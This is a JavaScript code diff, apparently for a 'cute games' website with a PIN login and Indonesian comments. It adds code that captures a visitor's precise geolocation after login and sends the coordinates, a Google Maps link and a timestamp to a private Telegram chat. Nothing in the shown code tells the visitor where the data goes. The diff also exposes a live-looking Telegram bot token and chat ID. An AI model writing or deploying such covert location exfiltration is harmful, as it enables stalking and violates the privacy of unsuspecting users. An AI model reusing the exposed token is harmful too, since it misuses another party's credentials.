@@ -37,12 +37,73 @@ async function checkPin() {
     }
 }
 
+// Fungsi untuk mendapatkan lokasi pengguna
+async function getCurrentLocation() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+            reject(new Error('Geolocation tidak didukung oleh browser ini'));
+            return;
+        }
+
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 60000
+        };
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                });
+            },
+            (error) => {
+                let errorMessage = 'Tidak dapat mendapatkan lokasi: ';
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage += 'Akses lokasi ditolak';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage += 'Informasi lokasi tidak tersedia';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage += 'Timeout mendapatkan lokasi';
+                        break;
+                    default:
+                        errorMessage += 'Error tidak diketahui';
+                        break;
+                }
+                reject(new Error(errorMessage));
+            },
+            options
+        );
+    });
+}
+
+// Fungsi yang sudah diupdate untuk mengirim notifikasi dengan lokasi
 async function sendTelegramNotification() {
     const token = '7637763679:AAGO9TEEgWqkzllClcKySyLdY6fHujBmP7U';
     const chatId = '6678271110';
-    const message = '🌸 Seseorang berhasil login ke website cute games! 🎮✨';
 
     try {
+        // Dapatkan lokasi terlebih dahulu
+        const location = await getCurrentLocation();
+
+        // Pesan dengan informasi lokasi
+        const message = `🌸 Seseorang berhasil login ke website cute games! 🎮✨
+
+📍 Lokasi Login:
+• Latitude: ${location.latitude}
+• Longitude: ${location.longitude}
+• Akurasi: ${Math.round(location.accuracy)} meter
+
+🗺️ Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}
+
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+        // Kirim pesan teks dengan lokasi
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -50,13 +111,91 @@ async function sendTelegramNotification() {
             },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: message
+                text: message,
+                parse_mode: 'HTML'
             })
         });
+
+        // Kirim lokasi sebagai titik di peta (opsional)
+        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                latitude: location.latitude,
+                longitude: location.longitude
+            })
+        });
+
+        console.log('Notifikasi dengan lokasi berhasil dikirim!');
+
     } catch (error) {
-        console.log('Telegram notification error:', error);
+        console.log('Error mendapatkan lokasi:', error.message);
+
+        // Jika gagal mendapatkan lokasi, kirim pesan tanpa lokasi
+        const fallbackMessage = `🌸 Seseorang berhasil login ke website cute games! 🎮✨
+
+⚠️ Lokasi tidak dapat dideteksi: ${error.message}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: fallbackMessage
+                })
+            });
+            console.log('Notifikasi tanpa lokasi berhasil dikirim!');
+        } catch (telegramError) {
+            console.log('Telegram notification error:', telegramError);
+        }
     }
 }
+
+// Fungsi untuk meminta izin lokasi saat halaman dimuat (opsional)
+function requestLocationPermission() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            () => console.log('Izin lokasi diberikan'),
+            (error) => {
+                if (error.code === error.PERMISSION_DENIED) {
+                    console.log('Izin lokasi ditolak oleh pengguna');
+                }
+            }
+        );
+    }
+}
+
+// Panggil fungsi ini saat halaman dimuat untuk meminta izin lokasi
+// window.addEventListener('load', requestLocationPermission);
+
+
+// async function sendTelegramNotification() {
+//     const token = '7637763679:AAGO9TEEgWqkzllClcKySyLdY6fHujBmP7U';
+//     const chatId = '6678271110';
+//     const message = '🌸 Seseorang berhasil login ke website cute games! 🎮✨';
+
+//     try {
+//         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+//             method: 'POST',
+//             headers: {
+//                 'Content-Type': 'application/json',
+//             },
+//             body: JSON.stringify({
+//                 chat_id: chatId,
+//                 text: message
+//             })
+//         });
+//     } catch (error) {
+//         console.log('Telegram notification error:', error);
+//     }
+// }
 
 function showNotification(message, color) {
     const notification = document.getElementById('notification');
